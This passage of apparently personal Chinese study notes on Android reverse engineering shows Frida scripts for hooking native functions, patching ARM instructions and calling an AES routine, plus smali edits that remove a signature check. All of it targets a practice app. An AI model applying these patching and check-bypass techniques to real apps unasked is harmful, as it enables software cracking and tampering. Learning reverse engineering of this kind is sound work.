      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> moduleAddr1 = Process.findModuleByName(<span class="string">&quot;lib52pojie.so&quot;</span>).base;  </span><br><span class="line"><span class="keyword">var</span> moduleAddr2 = Process.getModuleByName(<span class="string">&quot;lib52pojie.so&quot;</span>).base;  </span><br><span class="line"><span class="keyword">var</span> moduleAddr3 = Module.findBaseAddress(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br></pre></td></tr></table></div></figure>


        <h3 id="SO未导出函数与函数地址计算"   >
          <a href="#SO未导出函数与函数地址计算" class="heading-link"><i class="fas fa-link"></i></a><a href="#SO未导出函数与函数地址计算" class="headerlink" title="SO未导出函数与函数地址计算"></a>SO未导出函数与函数地址计算</h3>
      <p>可能存在函数运行，但是没有设置JNI静态导出类型的，只是在SO层内部使用，这时候可以通过加载地址来调用，同样对于JNI动态注册类型也适用。</p>
<ol>
<li><p>安卓里一般32 位的 so 中都是<code>thumb</code>指令，64 位的 so 中都是<code>arm</code>指令</p>
</li>
<li><p>通过IDA里的opcode bytes来判断</p>
<p>arm 指令为 4 个字节(options -&gt; general -&gt; Number of opcode bytes (non-graph) 输入4)</p>
<p>thumb指令不确定的，有的4字节，有的2字节</p>
</li>
<li><p>地址计算：</p>
<p>thumb 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移 +1</p>
<p>arm 指令，函数地址计算方式： so 基址 + 函数在 so 中的偏移</p>
</li>
</ol>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hookTest6</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印基址</span></span><br><span class="line">        <span class="keyword">var</span> soAddr = Module.findBaseAddress(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(soAddr);</span><br><span class="line">        <span class="keyword">var</span> funcaddr = soAddr.add(<span class="number">0x1071C</span>);  </span><br><span class="line">        <span class="built_in">console</span>.log(funcaddr);</span><br><span class="line">        <span class="keyword">if</span>(funcaddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            Interceptor.attach(funcaddr,&#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;  <span class="comment">//args参数</span></span><br><span class="line"></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="built_in">console</span>.log(retval.toInt32());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="Hook掉dlopen"   >
          <a href="#Hook掉dlopen" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hook掉dlopen" class="headerlink" title="Hook掉dlopen"></a>Hook掉dlopen</h3>
      <p>dlopen是用来加载so文件的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119092246579.png" alt="image-20240119092246579"></p>
<p>即可以通过hook时判断参数filename是否为我们想要的.so文件，来指定Hook到.so文件加载时运行的函数逻辑，这里即为关注hook加载lib52pojie.so文件的函数逻辑</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_dlopen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//这是低版本的android</span></span><br><span class="line">    <span class="keyword">var</span> dlopen = Module.findExportByName(<span class="literal">null</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line">    Interceptor.attach(dlopen, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> so_name = args[<span class="number">0</span>].readCString();</span><br><span class="line">            <span class="keyword">if</span> (so_name.indexOf(<span class="string">&quot;lib52pojie.so&quot;</span>) &gt;= <span class="number">0</span>) <span class="built_in">this</span>.call_hook = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.call_hook) hookTest2();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 高版本Android系统使用android_dlopen_ext</span></span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = Module.findExportByName(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    Interceptor.attach(android_dlopen_ext, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> so_name = args[<span class="number">0</span>].readCString();</span><br><span class="line">            <span class="keyword">if</span> (so_name.indexOf(<span class="string">&quot;lib52pojie.so&quot;</span>) &gt;= <span class="number">0</span>) <span class="built_in">this</span>.call_hook = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.call_hook) </span><br><span class="line">                <span class="comment">//这里实际hook在加载lib52pojie.so时候的逻辑为hookTest2();</span></span><br><span class="line">                hookTest2();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="十六、是时候学习一下Frida一把梭了-终"   >
          <a href="#十六、是时候学习一下Frida一把梭了-终" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、是时候学习一下Frida一把梭了-终" class="headerlink" title="十六、是时候学习一下Frida一把梭了(终)"></a>十六、是时候学习一下Frida一把梭了(终)</h2>
      
        <h3 id="Frida写数据"   >
          <a href="#Frida写数据" class="heading-link"><i class="fas fa-link"></i></a><a href="#Frida写数据" class="headerlink" title="Frida写数据"></a>Frida写数据</h3>
      <p>一般用在脱壳当中</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一般写在app的私有目录里，不然会报错:failed to open file (Permission denied)(实际上就是权限不足)</span></span><br><span class="line"><span class="keyword">var</span> file_path = <span class="string">&quot;/data/user/0/com.zj.wuaipojie/test.txt&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> file_handle = <span class="keyword">new</span> File(file_path, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (file_handle &amp;&amp; file_handle != <span class="literal">null</span>) &#123;</span><br><span class="line">        file_handle.write(data); <span class="comment">//写入数据</span></span><br><span class="line">        file_handle.flush(); <span class="comment">//刷新</span></span><br><span class="line">        file_handle.close(); <span class="comment">//关闭</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="inlinehook内联"   >
          <a href="#inlinehook内联" class="heading-link"><i class="fas fa-link"></i></a><a href="#inlinehook内联" class="headerlink" title="inlinehook内联"></a>inlinehook内联</h3>
      <p>写法和函数地址计算时的写法一样的，其实就是定位到某条汇编，然后进行Hook。</p>
<p>我感觉函数层面的原理就是基于这个的，只是当检测为函数时，就可以操作args了。而且这个onLeave，可能检测的是汇编 RET指令，然后修改返回的X0寄存器作为返回值，因为在这个例子里面，onLeave也能修改适用。</p>
<p>这里Hook的是check函数中的如下位置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119111302320.png" alt="image-20240119111302320"></p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inline_hook</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//根据导出函数名打印基址</span></span><br><span class="line">        <span class="keyword">var</span> soAddr = Module.findBaseAddress(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(soAddr);</span><br><span class="line">        <span class="keyword">var</span> funcaddr = soAddr.add(<span class="number">0x010428</span>);  </span><br><span class="line">        <span class="built_in">console</span>.log(funcaddr);</span><br><span class="line">        <span class="keyword">if</span>(funcaddr != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">            Interceptor.attach(funcaddr,&#123;</span><br><span class="line">                <span class="attr">onEnter</span>: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>)</span>&#123;  <span class="comment">//args参数</span></span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="built_in">this</span>.context.x22); <span class="comment">//注意此时就没有args概念了</span></span><br><span class="line">                    <span class="built_in">this</span>.context.x22 = ptr(<span class="number">1</span>); <span class="comment">//赋值方法参考上一节课</span></span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">onLeave</span>: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;  <span class="comment">//retval返回值</span></span><br><span class="line">                    <span class="built_in">console</span>.log(retval.toInt32());</span><br><span class="line">                    retval.replace(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这里Hook到1042C，然后给X0赋值为1也是一样的。那么其实对于Frida针对So层的Hook，其实具有更加细腻的汇编层面，那这个可以修改汇编代码吗？</p>

        <h3 id="汇编层面"   >
          <a href="#汇编层面" class="heading-link"><i class="fas fa-link"></i></a><a href="#汇编层面" class="headerlink" title="汇编层面"></a>汇编层面</h3>
      <p>[Online ARM to HEX Converter (armconverter.com)](<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://armconverter.com/?code=mov" >https://armconverter.com/?code=mov</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> w0,1)</p>
<ul>
<li><p>读取</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var soAddr = Module.findBaseAddress(&quot;lib52pojie.so&quot;);</span><br><span class="line">var codeAddr = Instruction.parse(soAddr.add(0x10428));</span><br><span class="line">console.log(codeAddr.toString());</span><br></pre></td></tr></table></div></figure></li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240119111659002.png" alt="image-20240119111659002"></p>
<ul>
<li><p>写入</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hexToBytes</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.length;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.substr(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.push(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> soAddr = Module.findBaseAddress(<span class="string">&quot;lib52pojie.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> codeAddr = Instruction.parse(soAddr.add(<span class="number">0x10428</span>));</span><br><span class="line">    <span class="built_in">console</span>.log(codeAddr.toString());</span><br><span class="line">    Memory.patchCode(codeAddr, <span class="number">4</span>, <span class="function"><span class="keyword">function</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> writer = <span class="keyword">new</span> Arm64Writer(code, &#123; <span class="attr">pc</span>: codeAddr &#125;);</span><br><span class="line">        writer.putBytes(hexToBytes(<span class="string">&quot;20008052&quot;</span>));</span><br><span class="line">        writer.flush();</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>会报错</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Error: expected a pointer</span><br><span class="line">    at value (frida/runtime/core.js:207)</span><br><span class="line">    at compile (/root/Desktop/CTF/AndroidRevFrida/test.js:161)</span><br><span class="line">    at &lt;anonymous&gt; (/root/Desktop/CTF/AndroidRevFrida/test.js:166)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOps (frida/node_modules/frida-java-bridge/index.js:250)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/index.js:225)</span><br><span class="line">    at &lt;anonymous&gt; (frida/node_modules/frida-java-bridge/lib/vm.js:12)</span><br><span class="line">    at _performPendingVmOpsWhenReady (frida/node_modules/frida-java-bridge/index.js:244)</span><br><span class="line">    at perform (frida/node_modules/frida-java-bridge/index.js:204)</span><br><span class="line">    at main (/root/Desktop/CTF/AndroidRevFrida/test.js:169)</span><br><span class="line">    at apply (native)</span><br><span class="line">    at &lt;anonymous&gt; (frida/runtime/core.js:51)</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h3 id="SO层函数主动调用"   >
          <a href="#SO层函数主动调用" class="heading-link"><i class="fas fa-link"></i></a><a href="#SO层函数主动调用" class="headerlink" title="SO层函数主动调用"></a>SO层函数主动调用</h3>
      <p>这里即主动调用AES加密，参数和返回值均为字符串指针，那么就写pointer</p>
<figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> funcAddr = Module.findBaseAddress(<span class="string">&quot;lib52pojie.so&quot;</span>).add(<span class="number">0xe85c</span>);</span><br><span class="line"><span class="comment">//声明函数指针</span></span><br><span class="line"><span class="comment">//NativeFunction的第一个参数是地址，第二个参数是返回值类型，第三个[]里的是传入的参数类型(有几个就填几个)</span></span><br><span class="line"><span class="keyword">var</span> aesAddr = <span class="keyword">new</span> NativeFunction(funcAddr , <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">var</span> encry_text = Memory.allocUtf8String(<span class="string">&quot;OOmGYpk6s0qPSXEPp4X31g==&quot;</span>);    <span class="comment">//开辟一个指针存放字符串       </span></span><br><span class="line"><span class="keyword">var</span> key = Memory.allocUtf8String(<span class="string">&#x27;wuaipojie0123456&#x27;</span>); </span><br><span class="line"><span class="built_in">console</span>.log(aesAddr(encry_text ,key).readCString());</span><br></pre></td></tr></table></div></figure>

<p>对应的数据类型如下</p>
<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://frida.re/docs/javascript-api/#nativefunction" >JavaScript API | Frida • A world-class dynamic instrumentation toolkit</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">数据类型</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">void</td>
<td align="left">无返回值</td>
</tr>
<tr>
<td align="left">pointer</td>
<td align="left">指针</td>
</tr>
<tr>
<td align="left">int</td>
<td align="left">整数</td>
</tr>
<tr>
<td align="left">long</td>
<td align="left">长整数</td>
</tr>
<tr>
<td align="left">char</td>
<td align="left">字符</td>
</tr>
<tr>
<td align="left">float</td>
<td align="left">浮点数</td>
</tr>
<tr>
<td align="left">double</td>
<td align="left">双精度浮点数</td>
</tr>
<tr>
<td align="left">bool</td>
<td align="left">布尔值</td>
</tr>
</tbody></table></div>

        <h2 id="番外"   >
          <a href="#番外" class="heading-link"><i class="fas fa-link"></i></a><a href="#番外" class="headerlink" title="番外"></a>番外</h2>
      
        <h3 id="去除签名校验"   >
          <a href="#去除签名校验" class="heading-link"><i class="fas fa-link"></i></a><a href="#去除签名校验" class="headerlink" title="去除签名校验"></a>去除签名校验</h3>
      <p>手动去除，搜索app kill，找到第一个，进入查找f函数，修改f函数后保存</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.method public static f()Ljava/util/List;</span><br><span class="line">    .registers 2</span><br><span class="line">    .annotation build Landroidx/annotation/NonNull;</span><br><span class="line">    .end annotation</span><br><span class="line"></span><br><span class="line">    .annotation system Ldalvik/annotation/Signature;</span><br><span class="line">        value = &#123;</span><br><span class="line">            &quot;()&quot;,</span><br><span class="line">            &quot;Ljava/util/List&lt;&quot;,</span><br><span class="line">            &quot;Ljava/lang/String;&quot;,</span><br><span class="line">            &quot;&gt;;&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    .end annotation</span><br><span class="line"></span><br><span class="line">    .line 1</span><br><span class="line">    new-instance v0, Ljava/util/ArrayList;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v0&#125;, Ljava/util/ArrayList;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    const-string v1, &quot;F9:6C:E9:5F:D5:47:BE:DF:81:15:E3:71:8A:10:54:45&quot; </span><br><span class="line">    #创建了一个新的 ArrayList 实例，然后向列表中添加了一个字符串常量 &quot;F9:6C:E9:5F:D5:47:BE:DF:81:15:E3:71:8A:10:54:45&quot;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v1&#125;, Ljava/util/ArrayList;-&gt;add(Ljava/lang/Object;)Z</span><br><span class="line"></span><br><span class="line">    return-object v0</span><br><span class="line">.end method</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>










        <h3 id="去除更新弹窗"   >
          <a href="#去除更新弹窗" class="heading-link"><i class="fas fa-link"></i></a><a href="#去除更新弹窗" class="headerlink" title="去除更新弹窗"></a>去除更新弹窗</h3>
      
        <h1 id="安卓逆向入门笔记"   >
          <a href="#安卓逆向入门笔记" class="heading-link"><i class="fas fa-link"></i></a><a href="#安卓逆向入门笔记" class="headerlink" title="安卓逆向入门笔记"></a>安卓逆向入门笔记</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1781093-1-1.html" >https://www.52pojie.cn/thread-1781093-1-1.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-修改默认Activity"   >
          <a href="#1-修改默认Activity" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-修改默认Activity" class="headerlink" title="1.修改默认Activity"></a>1.修改默认Activity</h2>
      
        <h3 id="a-解包"   >
          <a href="#a-解包" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-解包" class="headerlink" title="a)解包"></a>a)解包</h3>
      <p>使用apktool进行反编译，<code>apktool d xxx.apk</code>。将<code>class.dex</code>从apk中解包出来，用<code>d2j-dex2jar class.dex</code>转换为<code>class-dex2jar.jar</code>包</p>

        <h3 id="b-添加Activity-布局文件"   >
          <a href="#b-添加Activity-布局文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-添加Activity-布局文件" class="headerlink" title="b)添加Activity/布局文件"></a>b)添加Activity/布局文件</h3>
      <p>手写Activity，保存为myActivity.smali</p>
<figure class="highlight smali"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">###### Class com.p005zj.wuaipojie.p006ui.MyActivity (com.zj.wuaipojie.ui.MyActivity)</span></span><br><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcom/zj/wuaipojie/ui/MyActivity;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Landroidx/appcompat/app/AppCompatActivity;</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">&quot;MyActivity.java&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .registers</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 7</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Landroidx/appcompat/app/AppCompatActivity;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># virtual methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span> onBackPressed()V</span><br><span class="line"><span class="keyword">    .registers</span> 2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-super </span>&#123;p0&#125;, <span class="class">Landroidx/appcompat/app/AppCompatActivity;</span>-&gt;onBackPressed()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0&#125;, <span class="class">Landroid/app/Activity;</span>-&gt;finish()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> protected</span> onCreate(<span class="class">Landroid/os/Bundle;</span>)V</span><br><span class="line"><span class="keyword">    .registers</span> 6</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>p1, 0x7f0b007e</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, p1&#125;, <span class="class">Lcom/zj/wuaipojie/ui/MyActivity;</span>-&gt;setContentView(I)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> new-instance </span>v0, <span class="class">Landroid/os/Handler;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v0&#125;, <span class="class">Landroid/os/Handler;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lcom/zj/wuaipojie/ui/MyActivity;</span>-&gt;handler:<span class="class">Landroid/os/Handler;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> new-instance </span>v0, <span class="class">Lcom/zj/wuaipojie/ui/MyActivity$1;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v0, p0&#125;, <span class="class">Lcom/zj/wuaipojie/ui/MyActivity$1;</span>-&gt;&lt;init&gt;(<span class="class">Lcom/zj/wuaipojie/ui/MyActivity;</span>)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-wide/16 </span>v1, 0x12c</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, v0, v1, v2&#125;, <span class="class">Landroid/os/Handler;</span>-&gt;postDelayed(<span class="class">Ljava/lang/Runnable;</span>J)Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="keyword">    .line</span> 20</span><br><span class="line">   <span class="built_in"> new-instance </span>v0, <span class="class">Landroid/content/Intent;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-class </span>v1, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v0, p0, v1&#125;, <span 